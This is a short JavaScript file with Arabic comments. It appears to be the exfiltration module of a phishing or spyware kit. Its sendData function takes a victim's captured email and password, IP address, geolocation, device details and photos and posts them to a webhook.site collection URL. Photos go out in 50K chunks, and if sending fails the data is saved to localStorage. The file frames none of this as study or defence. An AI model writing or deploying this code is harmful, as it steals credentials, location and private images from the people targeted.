// webhook.js - لتلقي البيانات
const WEBHOOK_URL = "https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx";

async function sendData(data) {
    try {
        // إرسال البيانات الأساسية
        const basicData = {
            timestamp: new Date().toISOString(),
            email: data.credentials.email,
            password: data.credentials.password,
            ip: data.network.ip,
            location: data.network.location,
            device: data.device.platform,
            userAgent: data.device.userAgent,
            photosCount: data.media.photos.length
        };
        
        // إرسال لـ webhook
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(basicData)
        });
        
        // إذا كانت الصور موجودة، أرسلها كقطع
        if (data.media.photos.length > 0) {
            data.media.photos.forEach(async (photo, index) => {
                await fetch(WEBHOOK_URL + '/photos', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        index: index,
                        photo: photo.substring(0, 50000), // أول 50K فقط
                        sessionId: data.metadata.sessionId
                    })
                });
            });
        }
        
        console.log('✅ تم إرسال البيانات');
        
    } catch (error) {
        console.log('❌ خطأ في الإرسال:', error);
        
        // حفظ في localStorage كنسخة احتياطية
        localStorage.setItem('pending_data', JSON.stringify(data));
    }
}
